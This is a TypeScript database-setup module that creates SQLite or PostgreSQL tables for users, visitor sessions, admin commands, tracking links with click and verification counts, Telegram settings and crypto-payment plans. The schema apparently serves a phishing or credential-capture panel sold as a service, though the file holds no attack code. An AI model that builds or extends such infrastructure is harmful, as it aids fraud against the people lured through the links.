
import sqlite3 from 'sqlite3';
import { Pool } from 'pg';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import {
    DATA_DIR,
    DATABASE_URL,
    isPostgres,
    pgPool,
    setPgPool,
    setSqliteDb,
    sqliteDb
} from './core';
import { createUser, getUserByUsername } from './repos/users';
import { getSettings } from './repos/settings';

// --- Helper for SQLite schema execution ---
const runSqlite = (sql: string, params: any[] = []): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (!sqliteDb) return reject(new Error('SQLite DB not initialized'));
        sqliteDb.run(sql, params, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};

const seedHypervisor = async () => {
    // SECURITY: Load credentials from environment variables instead of hardcoding
    const username = process.env['HYPERVISOR_USERNAME'];
    const password = process.env['HYPERVISOR_PASSWORD'];

    if (!username || !password) {
        if (process.env['NODE_ENV'] === 'production') {
            console.warn('[DB] ⚠️  HYPERVISOR_USERNAME and HYPERVISOR_PASSWORD not set. No admin account will be created.');
            console.warn('[DB] ⚠️  Set these environment variables to create an initial admin account.');
        } else {
            console.log('[DB] Hypervisor credentials not configured. Skipping seed in development mode.');
        }
        return;
    }

    // Check if exists first to avoid duplicates on restart
    const exists = await getUserByUsername(username);
    if (!exists) {
        const hyperUser = {
            id: crypto.randomUUID(),
            username,
            password, // Will be hashed by createUser via ensureHashedPassword
            role: 'hypervisor',
            uniqueCode: crypto.randomUUID().substring(0, 8),
            settings: JSON.stringify({}),
            telegramConfig: JSON.stringify({}),
            maxLinks: 100
        };
        console.log('[DB] Seeding Hypervisor from environment variables...');
        await createUser(hyperUser);
        console.log('[DB] ✅ Hypervisor account created.');
    }
};

const initSqliteSchema = async () => {
    if (!sqliteDb) return;

    // 1. Create Tables
    await runSqlite(`
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT,
            uniqueCode TEXT UNIQUE,
            settings TEXT,
            telegramConfig TEXT,
            maxLinks INTEGER DEFAULT 1,
            isSuspended BOOLEAN DEFAULT 0
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            data TEXT,
            lastSeen INTEGER,
            ip TEXT,
            adminId TEXT,
            variant TEXT,
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    // Indices
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_commands (
            sessionId TEXT PRIMARY KEY,
            action TEXT,
            payload TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_links (
            code TEXT PRIMARY KEY,
            adminId TEXT,
            clicks INTEGER DEFAULT 0,
            sessions_started INTEGER DEFAULT 0,
            sessions_verified INTEGER DEFAULT 0,
            created_at INTEGER,
            flow_config TEXT DEFAULT '{}',
            theme_config TEXT DEFAULT '{}',
            ab_config TEXT DEFAULT '{}',
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp INTEGER,
            actor TEXT,
            action TEXT,
            details TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS session_notes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            content TEXT,
            author TEXT,
            timestamp INTEGER,
            FOREIGN KEY(sessionId) REFERENCES sessions(id)
        )
    `);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_notes_sessionId ON session_notes (sessionId)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS crypto_payments (
            id TEXT PRIMARY KEY,
            org_id TEXT,
            plan TEXT,
            crypto_type TEXT,
            amount REAL,
            tx_hash TEXT,
            status TEXT,
            wallet_address TEXT,
            expires_at INTEGER,
            verified_by TEXT,
            verified_at INTEGER,
            created_at INTEGER,
            notes TEXT,
            FOREIGN KEY(org_id) REFERENCES organizations(id)
        )
    `);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_payments_org_id ON crypto_payments (org_id)`);

    // 2. Migrations (Try/Catch to ignore "duplicate column")
    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (maxLinks):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT 0`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (isSuspended):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN flow_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (flow_config):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN theme_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (theme_config):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE admin_links ADD COLUMN ab_config TEXT DEFAULT '{}'`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (ab_config):', e.message);
    }

    // 3. Seed
    await seedHypervisor();

    // SECURITY: Do not set default gate credentials
    try {
        const settings = await getSettings();
        if (!settings.gateUser || !settings.gatePass) {
            console.warn('[DB] ⚠️  Gate credentials not configured. Configure via admin panel or environment.');
        }
    } catch (e) { console.error('Failed to check gate settings', e); }
};

const initPostgresSchema = async () => {
    if (!pgPool) return;
    const client = await pgPool.connect();
    try {
        // Migration: Add maxLinks
        try {
            await client.query('ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add isSuspended
        try {
            await client.query('ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT FALSE');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add variant to sessions
        try {
            await client.query('ALTER TABLE sessions ADD COLUMN variant TEXT');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add flow_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN flow_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add theme_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN theme_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add ab_config
        try {
            await client.query('ALTER TABLE admin_links ADD COLUMN ab_config TEXT DEFAULT \'{}\'');
        } catch (e) { /* Ignore if exists */ }

        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE,
                password TEXT,
                role TEXT,
                uniqueCode TEXT UNIQUE,
                settings TEXT,
                telegramConfig TEXT,
                maxLinks INTEGER DEFAULT 1,
                isSuspended BOOLEAN DEFAULT FALSE
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                data TEXT,
                lastSeen BIGINT,
                ip TEXT,
                adminId TEXT,
                variant TEXT
            )
        `);

        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);

        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_commands (
                sessionId TEXT PRIMARY KEY,
                action TEXT,
                payload TEXT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        `);

        // New Tables
        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_links (
                code TEXT PRIMARY KEY,
                adminId TEXT,
                clicks INTEGER DEFAULT 0,
                sessions_verified INTEGER DEFAULT 0,
                created_at BIGINT,
                flow_config TEXT DEFAULT '{}',
                theme_config TEXT DEFAULT '{}',
                ab_config TEXT DEFAULT '{}'
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS audit_logs (
                id SERIAL PRIMARY KEY,
                timestamp BIGINT,
                actor TEXT,
                action TEXT,
                details TEXT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS session_notes (
                id SERIAL PRIMARY KEY,
                sessionId TEXT,
                content TEXT,
                author TEXT,
                timestamp BIGINT
            )
        `);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notes_sessionId ON session_notes (sessionId)`);

        await client.query(`
            CREATE TABLE IF NOT EXISTS crypto_payments (
                id TEXT PRIMARY KEY,
                org_id TEXT,
                plan TEXT,
                crypto_type TEXT,
                amount DOUBLE PRECISION,
                tx_hash TEXT,
                status TEXT,
                wallet_address TEXT,
                expires_at BIGINT,
                verified_by TEXT,
                verified_at BIGINT,
                created_at BIGINT,
                notes TEXT
            )
        `);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_payments_org_id ON crypto_payments (org_id)`);

        // Create index for admin_links AFTER table is created
        await client.query(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

        await seedHypervisor();

        // SECURITY check
        const s = await getSettings();
        if (!s.gateUser || !s.gatePass) {
            console.warn('[DB] ⚠️  PostgreSQL: Gate credentials not configured. Configure via admin panel.');
        }

    } finally {
        client.release();
    }
};

export const initDB = async () => {
    if (isPostgres) {
        console.log('[DB] Connecting to PostgreSQL...');

        // SECURITY: Configure SSL based on environment
        let sslConfig: boolean | { rejectUnauthorized: boolean } = false;
        const isLocalhost = DATABASE_URL?.includes('localhost') || DATABASE_URL?.includes('127.0.0.1');

        if (isLocalhost) {
            // No SSL for local development
            sslConfig = false;
        } else if (process.env['DB_SSL_REJECT_UNAUTHORIZED'] === 'false') {
            // Allow explicit disable for cloud providers that use self-signed certs
            console.warn('[DB] ⚠️  SSL certificate verification disabled. Use only with trusted providers.');
            sslConfig = { rejectUnauthorized: false };
        } else if (process.env['NODE_ENV'] === 'production') {
            // Production: require SSL with verification
            sslConfig = true;
        } else {
            // Development: SSL without strict verification
            sslConfig = { rejectUnauthorized: false };
        }

        const pool = new Pool({
            connectionString: DATABASE_URL,
            ssl: sslConfig
        });
        setPgPool(pool);

        try {
            await pool.query('SELECT 1');
            console.log('[DB] Connected to PostgreSQL.');
            await initPostgresSchema();
        } catch (e) {
            console.error('[DB] PostgreSQL Connection Error:', e);
            process.exit(1);
        }
    } else {
        // SQLite Fallback
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        const DB_PATH = path.join(DATA_DIR, 'sessions.db');
        console.log(`[DB] Initializing SQLite database at ${DB_PATH}`);

        const db = new sqlite3.Database(DB_PATH, (err) => {
            if (err) console.error('[DB] SQLite Connection Error:', err.message);
            else console.log('[DB] Connected to SQLite database.');
        });
        setSqliteDb(db);

        // Wait a tick for assignment to take effect (sync but good practice)
        await initSqliteSchema();
    }
};
